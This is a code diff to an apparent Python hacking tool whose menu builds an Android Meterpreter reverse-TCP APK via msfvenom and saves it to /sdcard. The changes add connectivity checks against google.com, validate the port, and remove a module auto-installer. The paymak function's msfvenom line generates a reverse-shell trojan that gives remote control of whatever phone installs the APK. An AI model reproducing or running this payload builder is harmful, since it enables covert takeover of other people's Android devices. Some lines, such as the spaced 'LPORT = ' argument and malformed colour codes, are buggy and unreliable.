@@ -9,17 +9,14 @@ from Payload import *
 from core.banner import *
 import subprocess
 import pkg_resources
+import requests
 ############cheekng the module############
-required = {'socket', 'webbrowser'}
-installed = {pkg.key for pkg in pkg_resources.working_set}
-missing = required - installed
 
-if missing:
-    python = sys.executable
-    subprocess.check_call([python, '-m', 'pip', 'install', missing], stdout=subprocess.DEVNULL)
+import socket 
+from socket import gethostbyname , gethostname
 ############getting the lhost#################
 
-lhost = socket.gethostbyname(socket.gethostname)
+lhost = socket.gethostbyname(socket.gethostname())
 
 ############def functions#############
 
@@ -37,11 +34,18 @@ def slowprint(z):
 		sys.stdout.flush()
 		time.sleep(0.01)
 
+def connection(): 
+    connn = requests.get('https://www.google.com/').status_code
+    if connn == 200 :
+        print ("\033[36m ["+"\033[32m+"+"\033[36m]"+"\033[32m your are connected")
+    else :
+        print ("\033[31m Error try to "+"\033mconnect"+"\033[32m Wi-fi "+"\033[31before using this option")
+
 def paymak():
 	os.system("clear")
 	print("\033[36m==================[>>"+"\033[35m making the apk payload"+"\033[36m<<]==================")
 	port = input("\033[36m ["+"\033[32m*"+"\033[36m]"+"\033[32m enter lport"+"\033[33m use 8080 it the best port "+"\033[32m : "+"\033[37m")
-	if type(port == int):
+	if port.isnumeric() == True: 
 		name = input("\033[36m ["+"\033[32m*"+"\033[36m]"+"\033[32m enter a name for the payload "+"\033[33m without "+"\033[36m("+"\033[34m .apk"+"\033[36m)"+"\033[32m : "+"\033[37m")
 		os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT = {port} R > /sdcard/{name}.apk")
 		print("\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[36m DONE"+"\033[37m")
@@ -49,6 +53,7 @@ def paymak():
 		os.system("clear")
 		return start()
 	else :
+		print('\033[36m ['+'\033[31m-'+'\033m[36m]'+'\033[31m Wrong input')
 		time.sleep(4)
 		os.system("clear")
 		return paymak()
@@ -176,7 +181,13 @@ def start():
 			print("\033[36m  "+r"        clear                                       it will clear the window")
 			print("\033[36m  "+r"        exit                                       it will exit the programme")
 		elif options_cheeker == "set payload":
-			paymak()
+			conn = requests.get('https://www.google.com/').status_code
+			if conn == 200 :
+				paymak()
+			else :
+				print ("\033[31m Error try to "+"\033mconnect"+"\033[32m Wi-fi "+"\033[31before using this option")
+				time.sleep(3)
+				return start()
 		elif options_cheeker == "show options":
 			command()
 		elif options_cheeker == "show cre_chann":
@@ -191,4 +202,3 @@ def start():
 		else:
 			print("\033[35m ["+"\033[31m?"+"\033[35m]"+"\033[31m Wrong Input the "+"\033[33m"+options_cheeker+"\033[31m it not found")
 			print("\033[36m ["+"\033[32m+"+"\033[36m]"+"\033[35m try to type"+"\033[33m help "+"\033[35mto show the help menu")
-			
